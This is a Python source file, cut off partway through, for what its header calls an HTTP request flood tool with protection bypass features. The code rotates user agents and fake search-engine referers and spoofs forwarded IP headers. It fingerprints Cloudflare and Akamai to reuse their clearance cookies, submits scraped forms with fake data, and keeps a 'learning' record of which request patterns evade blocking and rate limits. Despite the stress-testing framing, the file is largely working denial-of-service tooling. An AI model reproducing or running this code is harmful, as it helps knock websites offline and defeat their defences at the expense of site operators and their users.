#!/usr/bin/env python3
"""
Advanced HTTP Request Flood Tool with Protection Bypass Capabilities and Machine Learning
 original work by Upendra Khanal

A sophisticated, high-performance HTTP request tool optimized for stress testing web applications,
now with enhanced protection bypass features, reliability improvements, and machine learning capabilities.
"""

import asyncio
import aiohttp
import re
import time
import logging
import sys
import os
import signal
import platform
import random
import traceback
import argparse
import ipaddress
import socket
import json
import ssl
import subprocess
from typing import Dict, List, Optional, Tuple, Set, Any
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from collections import deque

# Try to import uvloop for massive performance boost on Linux/macOS
try:
    import uvloop # type: ignore
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    USING_UVLOOP = True
except ImportError:
    USING_UVLOOP = False

# Try to import additional useful libraries
try:
    import faker # type: ignore
    FAKER_AVAILABLE = True
    fake = faker.Faker()
except ImportError:
    FAKER_AVAILABLE = False

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Constants
DEFAULT_TIMEOUT = 15  # Increased default timeout for better reliability
DEFAULT_CONNECTIONS = 1000  # More reasonable default connection limit
DEFAULT_LIMIT_PER_HOST = 0  # unlimited per host
REQUEST_INTERVAL = 0.05  # Increased delay between batches for stability
MAX_RETRIES = 3  # Maximum number of retries for failed requests
MAX_REDIRECTS = 10  # Maximum number of redirects to follow
REFERERS = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://search.yahoo.com/search?p=",
    "https://duckduckgo.com/?q=",
    "https://www.baidu.com/s?wd=",
    "https://yandex.com/search/?text=",
    "https://www.ecosia.org/search?q="
]

# Search terms to combine with referers
SEARCH_TERMS = [
    "official website", "login", "homepage", "services", "contact",
    "information", "about", "help", "support", "portal"
]

# Common user agents for rotation
USER_AGENTS = [
    # Chrome
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/123.0.0.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/123.0.0.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",

    # Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/119.0 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/119.0 Firefox/119.0",

    # Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",

    # Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/123.0.0.0 Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36 EdgA/123.0.0.0",

    # Opera
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0"
]

# Common languages for Accept-Language header
LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "it-IT,it;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "ko-KR,ko;q=0.9,en;q=0.8",
    "pt-BR,pt;q=0.9,en;q=0.8",
    "ru-RU,ru;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "zh-TW,zh;q=0.9,en;q=0.8",
    "ar-SA,ar;q=0.9,en;q=0.8",
    "hi-IN,hi;q=0.9,en;q=0.8",
    "ne-NP,ne;q=0.9,en;q=0.8"  # Nepali
]

# Common cookie names for randomization
COOKIE_NAMES = [
    "session", "sessionid", "auth", "token", "user", "userid", "visitor", "visitorid",
    "guest", "guestid", "login", "loginid", "consent", "preferences", "_ga", "_gid",
    "campaign", "source", "medium", "term", "content", "_fbp", "utm_source", "utm_medium",
    "utm_campaign", "utm_term", "utm_content", "utm_id", "ref", "referer", "referral"
]


class RequestLearningSystem:
    """Implements a machine learning system to adapt request patterns based on success/failure history."""
    
    def __init__(self, base_url: str, persistence_file: str = None):
        self.base_url = base_url
        self.domain = urlparse(base_url).netloc
        self.persistence_file = persistence_file or f"{self.domain.replace('.', '_')}_learning.json"
        
        # Strategy success tracking
        self.strategy_success = {
            "headers": {},          # Track which headers work
            "user_agents": {},      # Track which user agents work
            "request_patterns": {}, # Track which request patterns work
            "delays": {},           # Track which delays work
            "methods": {},          # Track which HTTP methods work
            "paths": {}             # Track which paths work
        }
        
        # Failed attempts tracking
        self.blocked_patterns = {
            "headers": set(),       # Headers that triggered blocking
            "user_agents": set(),   # User agents that triggered blocking
            "request_patterns": set(), # Request patterns that triggered blocking
            "ip_blocked": False,    # Whether our IP appears to be blocked
            "rate_limited": False   # Whether we appear to be rate limited
        }
        
        # Learning metrics
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.success_rate = 0.0
        self.last_success_check_time = time.time()
        self.learning_rate = 0.1  # How quickly to adapt to new information
        
        # Optimal strategies cache
        self.strategy_cache = {}
        self.strategy_cache_time = 0
        self.strategy_cache_duration = 60  # Cache strategies for 60 seconds
        
        # Load previous learning if available
        self._load_learning()
        
    def _load_learning(self):
        """Load previous learning data from persistence file if it exists."""
        try:
            if os.path.exists(self.persistence_file):
                with open(self.persistence_file, 'r') as f:
                    data = json.load(f)
                    
                    # Load strategy success data
                    if "strategy_success" in data:
                        for key, value in data["strategy_success"].items():
                            self.strategy_success[key] = value
                    
                    # Load blocked patterns
                    blocked = data.get("blocked_patterns", {})
                    for key, value in blocked.items():
                        if key in ["headers", "user_agents", "request_patterns"]:
                            self.blocked_patterns[key] = set(value)
                        else:
                            self.blocked_patterns[key] = value
                    
                    # Load metrics
                    metrics = data.get("metrics", {})
                    self.total_requests = metrics.get("total_requests", 0)
                    self.successful_requests = metrics.get("successful_requests", 0)
                    self.failed_requests = metrics.get("failed_requests", 0)
                    self.success_rate = metrics.get("success_rate", 0.0)
                            
                    logger.info(f"Loaded learning data for {self.domain} - Success rate: {self.success_rate:.2f}%")
        except Exception as e:
            logger.warning(f"Could not load learning data: {str(e)}")
            
    def save_learning(self):
        """Save learning data to persistence file."""
        try:
            # Convert sets to lists for JSON serialization
            save_data = {
                "strategy_success": self.strategy_success,
                "blocked_patterns": {
                    "headers": list(self.blocked_patterns["headers"]),
                    "user_agents": list(self.blocked_patterns["user_agents"]),
                    "request_patterns": list(self.blocked_patterns["request_patterns"]),
                    "ip_blocked": self.blocked_patterns["ip_blocked"],
                    "rate_limited": self.blocked_patterns["rate_limited"]
                },
                "metrics": {
                    "total_requests": self.total_requests,
                    "successful_requests": self.successful_requests,
                    "failed_requests": self.failed_requests,
                    "success_rate": self.success_rate
                }
            }
            
            with open(self.persistence_file, 'w') as f:
                json.dump(save_data, f, indent=2)
                
            logger.debug(f"Saved learning data for {self.domain}")
        except Exception as e:
            logger.warning(f"Could not save learning data: {str(e)}")
    
    def _update_metrics(self):
        """Update success rate and other metrics."""
        if self.total_requests > 0:
            self.success_rate = (self.successful_requests / self.total_requests) * 100
            
        # Periodic logging of progress
        current_time = time.time()
        if current_time - self.last_success_check_time >= 60:  # Log every minute
            self.last_success_check_time = current_time
            logger.info(f"Learning system: Success rate {self.success_rate:.2f}% " +
                       f"({self.successful_requests}/{self.total_requests} requests)")
            
    def record_success(self, request_info):
        """Record a successful request to learn from."""
        # Extract relevant info from the request
        headers = request_info.get("headers", {})
        user_agent = headers.get("User-Agent", "")
        method = request_info.get("method", "GET")
        path = request_info.get("path", "/")
        delay = request_info.get("delay", 0)
        
        # Update success counters
        for header, value in headers.items():
            header_key = f"{header}:{value}"
            self.strategy_success["headers"][header_key] = self.strategy_success["headers"].get(header_key, 0) + 1
            
        self.strategy_success["user_agents"][user_agent] = self.strategy_success["user_agents"].get(user_agent, 0) + 1
        self.strategy_success["methods"][method] = self.strategy_success["methods"].get(method, 0) + 1
        self.strategy_success["paths"][path] = self.strategy_success["paths"].get(path, 0) + 1
        
        delay_key = str(round(delay, 2))
        self.strategy_success["delays"][delay_key] = self.strategy_success["delays"].get(delay_key, 0) + 1
        
        # Update request pattern success
        pattern = f"{method}:{path}"
        self.strategy_success["request_patterns"][pattern] = self.strategy_success["request_patterns"].get(pattern, 0) + 1
        
        # Update metrics
        self.total_requests += 1
        self.successful_requests += 1
        self._update_metrics()
        
        # Occasionally check if a previously blocked pattern now works
        if random.random() < 0.05 and self.blocked_patterns["request_patterns"]:
            # Try to remove a pattern from blocked list if it now succeeds
            pattern_to_test = next(iter(self.blocked_patterns["request_patterns"]))
            self.blocked_patterns["request_patterns"].remove(pattern_to_test)
            logger.debug(f"Removed {pattern_to_test} from blocked patterns for testing")
        
        # Save periodically (could be optimized to save less frequently)
        if random.random() < 0.05:  # 5% chance to save on each success
            self.save_learning()
            
    def record_failure(self, request_info, failure_type, response_info=None):
        """Record a failed request to learn what to avoid."""
        # Extract relevant info from the request
        headers = request_info.get("headers", {})
        user_agent = headers.get("User-Agent", "")
        method = request_info.get("method", "GET")
        path = request_info.get("path", "/")
        
        # Update blocked patterns based on failure type
        if failure_type == "blocked":
            # Add the full user agent to blocked list
            self.blocked_patterns["user_agents"].add(user_agent)
            
            # Check for specific headers that might have triggered blocking
            if response_info and "body" in response_info:
                # Check for mentions of specific headers in error response
                for header in headers:
                    if header.lower() in response_info["body"].lower():
                        self.blocked_patterns["headers"].add(header)
                        
        elif failure_type == "rate_limited":
            self.blocked_patterns["rate_limited"] = True
            
            # Update request pattern to avoid
            pattern = f"{method}:{path}"
            self.blocked_patterns["request_patterns"].add(pattern)
            
        # Update metrics
        self.total_requests += 1
        self.failed_requests += 1
        self._update_metrics()
        
        # Invalidate strategy cache so we recalculate
        self.strategy_cache_time = 0
        
        # Save after each failure since failures are important to remember
        self.save_learning()
    
    def get_optimal_request_strategy(self):
        """Get the most successful request strategy based on learning."""
        # Check if we have a cached strategy that's still valid
        current_time = time.time()
        if self.strategy_cache and current_time - self.strategy_cache_time < self.strategy_cache_duration:
            return self.strategy_cache.copy()
            
        strategy = {}
        
        # Select best user agent if we have data
        if self.strategy_success["user_agents"]:
            # Sort by success count, descending
            best_agents = sorted(
                self.strategy_success["user_agents"].items(),
                key=lambda x: x[1],
                reverse=True
            )
            
            # Filter out blocked agents
            valid_agents = [agent for agent, _ in best_agents 
                           if agent not in self.blocked_patterns["user_agents"]]
            
            if valid_agents:
                # Pick one of the top 3 with some randomness
                top_agents = valid_agents[:3] if len(valid_agents) >= 3 else valid_agents
                strategy["user_agent"] = random.choice(top_agents)
            
        # Select best method
        if self.strategy_success["methods"]:
            best_methods = sorted(
                self.strategy_success["methods"].items(),
                key=lambda x: x[1],
                reverse=True
            )
            strategy["method"] = best_methods[0][0]
        
        # Select best delay
        if self.strategy_success["delays"]:
            best_delays = sorted(
                self.strategy_success["delays"].items(),
                key=lambda x: x[1],
                reverse=True
            )
            strategy["delay"] = float(best_delays[0][0])
            
        # Find best working request pattern
        if self.strategy_success["request_patterns"]:
            best_patterns = sorted(
                self.strategy_success["request_patterns"].items(),
                key=lambda x: x[1],
                reverse=True
            )
            
            # Filter out blocked patterns
            valid_patterns = [pattern for pattern, _ in best_patterns 
                             if pattern not in self.blocked_patterns["request_patterns"]]
            
            if valid_patterns:
                strategy["request_pattern"] = valid_patterns[0]
                
                # Extract method and path from pattern
                if ":" in valid_patterns[0]:
                    method, path = valid_patterns[0].split(":", 1)
                    strategy["method"] = method
                    strategy["path"] = path
            
        # Check for rate limiting and adjust strategy
        if self.blocked_patterns["rate_limited"]:
            # If we've seen rate limiting, use a conservative strategy
            strategy["conservative"] = True
            
            # Increase delay if rate limited
            if "delay" in strategy:
                strategy["delay"] = max(strategy["delay"], 0.5)  # At least 500ms delay
            else:
                strategy["delay"] = 0.5
                
        # Mark as IP blocked if that's been detected
        if self.blocked_patterns["ip_blocked"]:
            strategy["ip_blocked"] = True
                
        # Cache the strategy
        self.strategy_cache = strategy.copy()
        self.strategy_cache_time = current_time
        
        return strategy
    
    def is_likely_to_succeed(self, request_info):
        """Predict if a request is likely to succeed based on past learning."""
        # Extract relevant info from the request
        headers = request_info.get("headers", {})
        user_agent = headers.get("User-Agent", "")
        method = request_info.get("method", "GET")
        path = request_info.get("path", "/")
        
        # Check if we're using a known-bad user agent
        if user_agent in self.blocked_patterns["user_agents"]:
            return False, "user_agent_blocked"
            
        # Check if the request pattern is known to trigger rate limiting
        pattern = f"{method}:{path}"
        if pattern in self.blocked_patterns["request_patterns"]:
            return False, "pattern_blocked"
            
        # Check if any headers are known to trigger blocks
        for header in headers:
            if header in self.blocked_patterns["headers"]:
                return False, "header_blocked"
                
        # If we've detected IP blocking, we might need to warn
        if self.blocked_patterns["ip_blocked"]:
            return False, "ip_blocked"
            
        # Check if we're rate limited and need to be more conservative
        if self.blocked_patterns["rate_limited"]:
            optimal_strategy = self.get_optimal_request_strategy()
            if "delay" in optimal_strategy:
                request_delay = request_info.get("delay", 0)
                if request_delay < optimal_strategy["delay"]:
                    return False, "insufficient_delay"
            
        # If everything passes, it's likely to succeed
        return True, None
    
    def get_learning_stats(self):
        """Get statistics about the learning system for display."""
        stats = {
            "total_requests": self.total_requests,
            "successful_requests": self.successful_requests,
            "failed_requests": self.failed_requests,
            "success_rate": self.success_rate,
            "blocked_user_agents": len(self.blocked_patterns["user_agents"]),
            "blocked_headers": len(self.blocked_patterns["headers"]),
            "blocked_patterns": len(self.blocked_patterns["request_patterns"]),
            "ip_blocked": self.blocked_patterns["ip_blocked"],
            "rate_limited": self.blocked_patterns["rate_limited"],
            "best_strategies": self.get_optimal_request_strategy()
        }
        
        return stats


class ProtectionBypassEngine:
    """Implements various techniques to bypass common DDoS protections."""
    
    def __init__(self, base_url: str, target_domain: str):
        self.base_url = base_url
        self.target_domain = target_domain
        self.urlparts = urlparse(base_url)
        self.last_page_cookies = {}  # Store cookies from previous successful requests
        self.successful_paths = deque(maxlen=10)  # Store successful paths for variation
        self.found_forms = {}  # Store discovered forms
        self.fingerprinted = False  # Has the site been fingerprinted?
        self.protection_type = None  # Detected protection type
        
        # Protection-specific bypasses
        self.cloudflare_bypasses = {
            "cookies": {},
            "headers": {},
            "params": {}
        }
        
        self.akamai_bypasses = {
            "cookies": {},
            "headers": {},
            "params": {}
        }
        
        self.generic_bypasses = {
            "cookies": {},
            "headers": {},
            "params": {}
        }
    
    def get_random_path(self) -> str:
        """Generate a random path that resembles a legitimate URL."""
        if random.random() < 0.7 and self.successful_paths:
            # 70% chance to use a previously successful path with slight modifications
            base_path = random.choice(self.successful_paths)
            parsed = urlparse(base_path)
            
            # Add or modify query parameters
            query_dict = parse_qs(parsed.query)
            
            # Randomly add or modify a parameter
            if random.random() < 0.5:
                # Add a random parameter
                param_name = random.choice(["ref", "page", "id", "t", "s", "q", "view"])
                query_dict[param_name] = [str(int(time.time())) + str(random.randint(100, 999))]
            
            # Rebuild the query string
            new_query = urlencode(query_dict, doseq=True)
            
            # Rebuild the path
            new_path = urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment
            ))
            
            return new_path
        else:
            # Generate a completely new path
            common_paths = [
                "/",
                "/index.html",
                "/about",
                "/contact",
                "/services",
                "/news",
                "/information",
                "/login",
                "/register",
                "/faq",
                "/help",
                "/support"
            ]
            
            path = random.choice(common_paths)
            
            # Randomly add query parameters
            if random.random() < 0.3:
                params = {}
                for _ in range(random.randint(1, 3)):
                    param_name = random.choice(["ref", "page", "id", "t", "s", "q", "view"])
                    params[param_name] = str(int(time.time())) + str(random.randint(100, 999))
                
                query_string = urlencode(params)
                path += "?" + query_string
            
            # Generate full URL
            return f"{self.urlparts.scheme}://{self.urlparts.netloc}{path}"
    
    def get_random_referer(self) -> str:
        """Generate a random referer that appears legitimate."""
        if random.random() < 0.7:
            # 70% chance to use a search engine referer
            search_term = f"{self.target_domain} {random.choice(SEARCH_TERMS)}"
            referer = f"{random.choice(REFERERS)}{search_term}"
            return referer
        elif random.random() < 0.5:
            # 15% chance to use the website itself as referer
            return self.get_random_path()
        else:
            # 15% chance to use a common website as referer
            common_referers = [
                "https://www.facebook.com/",
                "https://twitter.com/",
                "https://www.linkedin.com/",
                "https://www.reddit.com/",
                "https://www.instagram.com/",
                "https://news.google.com/",
                f"https://translate.google.com/translate?sl=auto&tl=en&u={self.base_url}"
            ]
            return random.choice(common_referers)
    
    def get_random_user_agent(self) -> str:
        """Get a random user agent."""
        if FAKER_AVAILABLE and random.random() < 0.3:
            # 30% chance to use Faker for even more variety
            return fake.user_agent()
        else:
            return random.choice(USER_AGENTS)
    
    def generate_random_cookies(self) -> Dict[str, str]:
        """Generate random cookies that might help bypass protections."""
        cookies = {}
        
        # Add some previously successful cookies if we have them
        if self.last_page_cookies and random.random() < 0.8:
            cookies.update(self.last_page_cookies)
        
        # Add some random cookies
        if random.random() < 0.4:
            for _ in range(random.randint(1, 3)):
                cookie_name = random.choice(COOKIE_NAMES)
                cookie_value = f"{int(time.time())}-{random.randint(1000, 9999)}"
                cookies[cookie_name] = cookie_value
        
        # Add protection-specific cookies if detected
        if self.protection_type == "cloudflare" and self.cloudflare_bypasses["cookies"]:
            cookies.update(self.cloudflare_bypasses["cookies"])
        elif self.protection_type == "akamai" and self.akamai_bypasses["cookies"]:
            cookies.update(self.akamai_bypasses["cookies"])
        elif self.generic_bypasses["cookies"]:
            cookies.update(self.generic_bypasses["cookies"])
        
        return cookies
    
    def generate_headers(self) -> Dict[str, str]:
        """Generate headers designed to appear as legitimate browser traffic."""
        headers = {
            "User-Agent": self.get_random_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": random.choice(LANGUAGES),
            "Accept-Encoding": "gzip, deflate, br",
            "Referer": self.get_random_referer(),
            "DNT": "1" if random.random() < 0.7 else "0",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Sec-CH-UA": '"Chromium";v="123", "Google Chrome";v="123"',
            "Sec-CH-UA-Mobile": random.choice(["?0", "?1"]),
            "Sec-CH-UA-Platform": random.choice(['"Windows"', '"macOS"', '"Linux"', '"Android"', '"iOS"']),
        }
        
        # Add X-Forwarded-For with a random IP
        if random.random() < 0.6:
            random_ip = str(ipaddress.IPv4Address(random.randint(1, 2**32-1)))
            headers["X-Forwarded-For"] = random_ip
        
        # Add a custom header occasionally to appear more browser-like
        if random.random() < 0.3:
            custom_headers = {
                "X-Requested-With": "XMLHttpRequest",
                "X-Request-ID": f"{int(time.time())}-{random.randint(1000, 9999)}",
                "X-HTTP-Proto": "HTTP/1.1",
                "X-Real-IP": str(ipaddress.IPv4Address(random.randint(1, 2**32-1)))
            }
            headers[random.choice(list(custom_headers.keys()))] = custom_headers[random.choice(list(custom_headers.keys()))]
        
        # Add protection-specific headers if detected
        if self.protection_type == "cloudflare" and self.cloudflare_bypasses["headers"]:
            headers.update(self.cloudflare_bypasses["headers"])
        elif self.protection_type == "akamai" and self.akamai_bypasses["headers"]:
            headers.update(self.akamai_bypasses["headers"])
        elif self.generic_bypasses["headers"]:
            headers.update(self.generic_bypasses["headers"])
        
        return headers
    
    def update_from_response(self, response: aiohttp.ClientResponse, content: str = None) -> None:
        """Update our bypass engine based on server responses."""
        # Store cookies for future requests
        if response.cookies:
            for cookie_name, cookie in response.cookies.items():
                self.last_page_cookies[cookie_name] = cookie.value
        
        # Check for protection systems in headers and content
        self._fingerprint_protection(response, content)
        
        # If we got a successful response, store the path
        if 200 <= response.status < 300 and response.url:
            self.successful_paths.append(str(response.url))
            
            # If we have content, look for forms
            if content:
                self._extract_forms(content, str(response.url))
    
    def _fingerprint_protection(self, response: aiohttp.ClientResponse, content: str = None) -> None:
        """Identify the protection system being used."""
        # Already fingerprinted with high confidence
        if self.fingerprinted and self.protection_type:
            return
            
        # Check headers for protection system signatures
        headers = response.headers
        
        # Check for Cloudflare
        if any(h.lower() in [k.lower() for k in headers.keys()] for h in ["cf-ray", "cf-cache-status", "cf-request-id"]):
            self.protection_type = "cloudflare"
            self.fingerprinted = True
            logger.debug("Detected Cloudflare protection")
            
            # Extract useful Cloudflare cookies
            if "cf-ray" in headers:
                self.cloudflare_bypasses["headers"]["CF-RAY"] = headers["cf-ray"]
            
        # Check for Akamai
        elif any(h.lower() in [k.lower() for k in headers.keys()] for h in ["x-akamai-transformed", "akamai-x-cache-on"]):
            self.protection_type = "akamai"
            self.fingerprinted = True
            logger.debug("Detected Akamai protection")
            
        # Check content for protection system signatures if provided
        elif content:
            if "cloudflare" in content.lower() or "ray id" in content.lower():
                self.protection_type = "cloudflare"
                self.fingerprinted = True
                logger.debug("Detected Cloudflare protection from content")
                
                # Try to extract Cloudflare cookies from content
                try:
                    cf_cookie_match = re.search(r'name="cf_clearance"\s+value="([^"]+)"', content)
                    if cf_cookie_match:
                        self.cloudflare_bypasses["cookies"]["cf_clearance"] = cf_cookie_match.group(1)
                except Exception as e:
                    logger.debug(f"Error extracting Cloudflare cookies: {str(e)}")
            elif "akamai" in content.lower() or "reference number" in content.lower():
                self.protection_type = "akamai"
                self.fingerprinted = True
                logger.debug("Detected Akamai protection from content")
                
            # Generic protection detection based on response patterns
            elif response.status == 403 or response.status == 429:
                # If we get consistent 403/429 responses, assume generic protection
                if not self.protection_type:
                    self.protection_type = "generic"
                    logger.debug("Detected generic protection based on status codes")
    
    def _extract_forms(self, content: str, url: str) -> None:
        """Extract forms from HTML content for potential form submission."""
        try:
            form_matches = re.finditer(r'<form\s+[^>]*action=["\']?([^"\'\s>]+)["\']?[^>]*>(.*?)</form>', content, re.DOTALL)
            
            for match in form_matches:
                form_action = match.group(1)
                form_content = match.group(0)
                
                # Make form action absolute
                if not form_action.startswith(('http://', 'https://')):
                    parsed_url = urlparse(url)
                    if form_action.startswith('/'):
                        form_action = f"{parsed_url.scheme}://{parsed_url.netloc}{form_action}"
                    else:
                        base_path = '/'.join(parsed_url.path.split('/')[:-1]) + '/'
                        form_action = f"{parsed_url.scheme}://{parsed_url.netloc}{base_path}{form_action}"
                
                # Extract input fields
                input_matches = re.finditer(r'<input\s+[^>]*name=["\']?([^"\'\s>]+)["\']?[^>]*(?:value=["\']?([^"\'\s>]*)["\']?)?[^>]*>', form_content)
                
                form_data = {}
                for input_match in input_matches:
                    field_name = input_match.group(1)
                    field_value = input_match.group(2) if input_match.group(2) else ""
                    form_data[field_name] = field_value
                
                # Only store forms with at least one input field
                if form_data:
                    self.found_forms[form_action] = form_data
        except Exception as e:
            logger.debug(f"Error extracting forms: {str(e)}")
    
    def get_random_form_data(self) -> Tuple[str, Dict[str, str]]:
        """Return a random form URL and form data if available."""
        if not self.found_forms:
            return None, {}
            
        form_url = random.choice(list(self.found_forms.keys()))
        form_data = self.found_forms[form_url].copy()
        
        # Randomly modify some form fields to appear more legitimate
        for field in form_data:
            # Don't modify fields that might be security tokens
            if any(token in field.lower() for token in ["token", "csrf", "security", "auth", "captcha"]):
                continue
                
            # For common form fields, use more realistic data
            if "email" in field.lower():
                form_data[field] = f"user{random.randint(1000, 9999)}@example.com"
            elif "name" in field.lower():
                if FAKER_AVAILABLE:
                    form_data[field] = fake.name()
                else:
                    form_data[field] = f"User {random.randint(1000, 9999)}"
            elif "search" in field.lower() or "query" in field.lower():
                form_data[field] = f"{self.target_domain} {random.choice(SEARCH_TERMS)}"
            elif form_data[field] == "":
                form_data[field] = str(random.randint(1, 1000))
        
        return form_url, form_data


class RateLimitDetector:
    """Detects potential rate limiting or request blocking from server responses."""
    def __init__(self):
        self.status_counts = {}  # Track status code occurrences
        self.last_responses = []  # Store last N responses for pattern analysis
        self.max_stored_responses = 50
        self.consecutive_failures_threshold = 5  # Reduced to detect faster
        self.consecutive_failures = 0
        self.last_successful_time = time.time()
        self.potential_rate_limit = False
        self.rate_limit_warned = False
        self.lock = asyncio.Lock()
        self.response_time_threshold = 2.0  # Response time increase threshold in seconds
        self.rate_limit_detection_patterns = [
            # Common rate limit response patterns
            (re.compile(r'rate\s*limit', re.IGNORECASE), "Rate limit message in response body"),
            (re.compile(r'too\s*many\s*requests', re.IGNORECASE), "Too many requests message in response"),
            (re.compile(r'blocked', re.IGNORECASE), "IP or request blocked message in response"),
            (re.compile(r'denied', re.IGNORECASE), "Access denied message in response"),
            (re.compile(r'captcha', re.IGNORECASE), "Captcha challenge found in response"),
            (re.compile(r'security\s*challenge', re.IGNORECASE), "Security challenge in response"),
            (re.compile(r'suspicious\s*activity', re.IGNORECASE), "Suspicious activity message in response"),
            (re.compile(r'automated\s*request', re.IGNORECASE), "Automated request detection message"),
            (re.compile(r'protection', re.IGNORECASE), "Protection system message in response"),
            (re.compile(r'cloudflare', re.IGNORECASE), "Cloudflare challenge or error message")
        ]
        
    async def analyze_response(self, status_code: int, response_time: float, 
                              headers: Optional[dict] = None, content: Optional[str] = None) -> bool:
        """Analyze a response for rate limiting signals. Returns True if rate limited."""
        async with self.lock:
            # Record status code
            self.status_counts[status_code] = self.status_counts.get(status_code, 0) + 1
            
            # Record response information
            response_info = {
                'status': status_code,
                'time': response_time,
                'timestamp': time.time()
            }
            
            if headers:
                response_info['headers'] = headers
                
            self.last_responses.append(response_info)
            
            # Keep only the last N responses
            if len(self.last_responses) > self.max_stored_responses:
                self.last_responses.pop(0)
            
            # Check for consecutive failures
            if status_code == 0 or 400 <= status_code < 600:
                self.consecutive_failures += 1
                if self.consecutive_failures >= self.consecutive_failures_threshold and not self.rate_limit_warned:
                    print(f"\n[WARNING] Detected {self.consecutive_failures} consecutive failed responses. Possible rate limiting.")
                    self.rate_limit_warned = True
                    self.potential_rate_limit = True
                    return True
            else:
                self.consecutive_failures = 0
                self.last_successful_time = time.time()
                
            # Check for typical rate limit status codes
            if status_code in [429, 403, 418, 503] and self.status_counts.get(status_code, 0) >= 3 and not self.rate_limit_warned:
                rate_limit_message = f"[WARNING] Received multiple {status_code} responses. Server is likely rate limiting requests."
                print(f"\n{rate_limit_message}")
                self.rate_limit_warned = True
                self.potential_rate_limit = True
                return True
            
            # Check for rate limiting headers
            if headers:
                rate_limit_headers = [
                    "retry-after", "x-ratelimit-limit", "x-ratelimit-remaining", 
                    "x-ratelimit-reset", "ratelimit-limit", "ratelimit-remaining",
                    "ratelimit-reset", "x-rate-limit-limit", "x-rate-limit-remaining",
                    "x-rate-limit-reset"
                ]
                
                # Check if any rate limit header exists
                for header in rate_limit_headers:
                    if header.lower() in {k.lower(): v for k, v in headers.items()}:
                        message = f"[WARNING] Rate limit headers detected in response: {header}"
                        print(f"\n{message}")
                        self.rate_limit_warned = True
                        self.potential_rate_limit = True
                        return True
            
            # Check for rate limiting patterns in content
            if content:
                for pattern, description in self.rate_limit_detection_patterns:
                    if pattern.search(content):
                        message = f"[WARNING] {description} detected in response body"
                        print(f"\n{message}")
                        self.rate_limit_warned = True
                        self.potential_rate_limit = True
                        return True
                
            # Check response patterns (sudden increase in response time)
            if len(self.last_responses) >= 10:
                recent_times = [r['time'] for r in self.last_responses[-10:] if r['time'] > 0]
                if recent_times:  # Make sure we have some valid response times
                    avg_time = sum(recent_times) / len(recent_times)
